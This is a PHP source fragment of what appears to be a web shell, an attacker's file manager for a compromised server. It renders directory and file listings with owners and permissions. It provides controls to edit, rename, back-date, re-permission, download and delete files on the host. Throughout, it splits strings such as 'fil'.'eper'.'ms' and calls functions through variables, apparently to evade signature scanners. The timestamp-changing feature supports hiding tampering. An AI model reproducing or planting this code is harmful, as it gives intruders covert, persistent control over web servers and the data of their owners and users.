$euybrekw = $srl("//", "/", $euybrekw);
echo "<td><i class='fa fa-fol"."der' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybrekw."\">..</a></td>
<td><center>--</center></td>
<td><center>".fdt($euybrekw)."</center></td>
<td><center>".gor($euybrekw)." / ".ggr($euybrekw)."</center></td>
<td><center>";
if($isw($euybrekw)) echo '<font color="green">';
elseif(!$isr($euybrekw)) echo '<font color="red">';
echo statusnya($euybrekw);
if($isw($euybrekw) || !$isr($euybrekw)) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
<input type=\"hidden\" name=\"type\" value=\"d"."ir\">
<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/\">
<button type='submit' class='btf' name='pilih' value='fol"."der'><i class='fa fa-fol"."der' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
</form></center>";
echo "</tr>";

foreach($lokasinya as $ppkcina){
	$euybre = $lokasi."/".$ppkcina;
	$euybre = $srl("//", "/", $euybre);
	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
	echo "<tr>";
	echo "<td><i class='fa fa-fol"."der' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybre."\">".$ppkcina."</a></td>
	<td><center>--</center></td>
	<td><center>".fdt($euybre)."</center></td>
	<td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>
	<td><center>";
	if($isw($euybre)) echo '<font color="green">';
	elseif(!$isr($euybre)) echo '<font color="red">';
	echo statusnya($euybre);
	if($isw($euybre) || !$isr($euybre)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
	<input type=\"hidden\" name=\"type\" value=\"di"."r\">
	<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
	<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
$skd = "10"."24";
foreach($lokasinya as $mekicina) {
	$euybray = $lokasi."/".$mekicina;
	if(!$ifi("$lokasi/$mekicina")) continue;
	$size = $fsz("$lokasi/$mekicina")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
	$size = $rd($size/$skd,2).' M'.'B';
} else {
	$size = $size.' K'.'B';
}

echo "<tr>
<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>
<td><center>".$size."</center></td>
<td><center>".fdt($euybray)."</center></td>
<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
<td><center>";
if($isw("$lokasi/$mekicina")) echo '<font color="green">';
elseif(!$isr("$lokasi/$mekicina")) echo '<font color="red">';
echo statusnya("$lokasi/$mekicina");
if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&loknya=$lokasi\">
<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-down"."load' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
<input type=\"hidden\" name=\"type\" value=\"fi"."le\">
<input type=\"hidden\" name=\"name\" value=\"$mekicina\">
<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$mekicina\">
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($fl){
	$a = "sub"."st"."r";
	$b = "s"."pri"."ntf";
	$c = "fil"."eper"."ms";
$izin = $a($b('%o', $c($fl)), -4);
return $izin;
}
?>

